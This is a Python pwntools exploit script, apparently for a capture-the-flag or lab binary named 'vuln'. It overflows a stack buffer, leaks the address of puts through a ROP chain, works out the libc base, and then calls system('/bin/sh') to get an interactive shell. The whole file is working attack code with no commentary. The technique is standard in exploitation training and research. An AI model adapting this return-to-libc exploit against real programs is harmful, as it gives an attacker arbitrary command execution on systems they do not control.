#!/usr/bin/env python2

import sys
from pwn import *
import struct

context.log_level = "debug"

e = ELF("vuln")
main_address = e.symbols["main"]
puts_plt_address = e.plt["puts"]
puts_got_address = e.got["puts"]
pop_rdi_ret = 0x400673
log.info("puts_plt_address: 0x{:016x}".format(puts_plt_address))
log.info("puts_got_address: 0x{:016x}".format(puts_got_address))

# 1st stage payload
offset = 40
payload = offset * "A" + p64(pop_rdi_ret) + p64(puts_got_address) + p64(puts_plt_address) + p64(main_address)
log.info("".join("\\x{:02x}".format(ord(i)) for i in payload))

io = process("./vuln")
#gdb.attach(io)
io.sendline(payload)
io.recvline()
msg = io.recvline()
msg = msg.strip()
msg = msg + (8-len(msg)) * "\x00"
puts_address_in_libc = struct.unpack("<Q", msg)[0]
log.info("puts_address_in_libc: 0x{:016x}".format(puts_address_in_libc))

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_offset_in_libc = libc.symbols["puts"]
log.info("puts_offset_in_libc: 0x{:016x}".format(puts_offset_in_libc))

libc_base_address = puts_address_in_libc - puts_offset_in_libc
libc.address = libc_base_address
log.info("libc_base_address: 0x{:016x}".format(libc.address))
system_address_in_libc = libc.symbols["system"]
log.info("system_address_in_libc: 0x{:016x}".format(system_address_in_libc))

sh_address_in_libc = next(libc.search("/bin/sh\x00"))
log.info("sh_address_in_libc: 0x{:016x}".format(sh_address_in_libc))

payload = offset * "A" + p64(pop_rdi_ret) + p64(sh_address_in_libc) + p64(system_address_in_libc)
gdb.attach(io)
io.sendline(payload)

io.interactive()
